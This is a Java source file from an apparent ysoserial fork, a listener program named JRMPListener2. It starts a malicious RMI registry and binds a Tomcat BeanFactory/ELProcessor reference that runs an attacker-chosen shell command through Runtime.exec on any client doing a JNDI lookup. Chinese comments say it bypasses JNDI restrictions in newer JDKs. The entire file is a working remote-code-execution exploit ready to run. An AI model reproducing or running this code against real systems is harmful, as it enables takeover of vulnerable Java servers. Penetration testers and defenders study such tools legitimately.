package ysoserial.exploit;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 需要 tomcat 环境，可以绕过高版本jdk的jndi限制
 *
 * @author Jayl1n
 */
public class JRMPListener2 {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        if (args.length < 2) {
            System.err.println(JRMPListener2.class.getName() + " <port> <command>");
            System.exit(-1);
            return;
        }

        int rmi_port = Integer.parseInt(args[0]);
        System.out.println("Creating RMI Registry, RMI Port:" + rmi_port);
        System.setProperty("java.rmi.server.hostname", "0.0.0.0");
        Registry registry = LocateRegistry.createRegistry(rmi_port);


        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
            true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "RCE=eval"));
        ref.add(new StringRefAddr("RCE", "Runtime.getRuntime().exec('" + args[1] + "').waitFor()"));

        // Reference包装类
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());

    }
}
